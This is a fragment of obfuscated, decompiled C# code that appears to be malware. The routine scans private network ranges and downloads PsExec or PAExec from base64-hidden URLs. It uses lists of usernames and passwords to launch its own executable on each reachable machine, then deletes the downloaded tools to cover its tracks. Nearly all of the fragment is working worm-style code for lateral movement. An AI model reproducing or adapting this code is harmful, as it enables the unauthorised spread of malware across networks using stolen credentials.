				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && RnLJgPsOlWsH(ip))
				{
					if (oIxRFVSIpmRuMqIJ.AoHprIWbHuW == "YES")
					{
						for (int i = 0; i < bAYVukBQXPziyfQ.Count; i++)
						{
							if (oIxRFVSIpmRuMqIJ.scKRevUuzGg)
							{
								if (File.Exists(vigEXCsRSgXxsa))
								{
									oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(vigEXCsRSgXxsa, "\\\\" + ip + " -u \"" + bAYVukBQXPziyfQ[i] + "\" -p \"" + doAEIyHAiHMl[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(whwJHkxdxASLk))
							{
								oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(whwJHkxdxASLk, "\\\\" + ip + " -u \"" + bAYVukBQXPziyfQ[i] + "\" -p \"" + doAEIyHAiHMl[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (oIxRFVSIpmRuMqIJ.scKRevUuzGg)
					{
						if (File.Exists(vigEXCsRSgXxsa))
						{
							oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(vigEXCsRSgXxsa, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(whwJHkxdxASLk))
					{
						oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(whwJHkxdxASLk, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(vigEXCsRSgXxsa))
			{
				File.Delete(vigEXCsRSgXxsa);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(whwJHkxdxASLk))
			{
				File.Delete(whwJHkxdxASLk);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> HXPqiMOYKPdgZ()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string WJVrKGeOBqjbua()
	{
		if (IntPtr.Size == 8)
		{
			return ovjpMwmvYsyxKe(new Uri(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return ovjpMwmvYsyxKe(new Uri(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string LygqiSoKBpPQN()
	{
		if (IntPtr.Size == 8)
		{
			return ovjpMwmvYsyxKe(new Uri(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return ovjpMwmvYsyxKe(new Uri(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool RnLJgPsOlWsH(string qbbUBlVKHxZC)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(qbbUBlVKHxZC);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string ovjpMwmvYsyxKe(Uri gHBUpmxwBDaPSF)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(gHBUpmxwBDaPSF, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> uCzGVWXUynXy()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string zTCszjXeoCs in array4)
			{
				if (zTCszjXeoCs.Contains(":"))
				{
					array = array.Where((string o) => o != zTCszjXeoCs).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
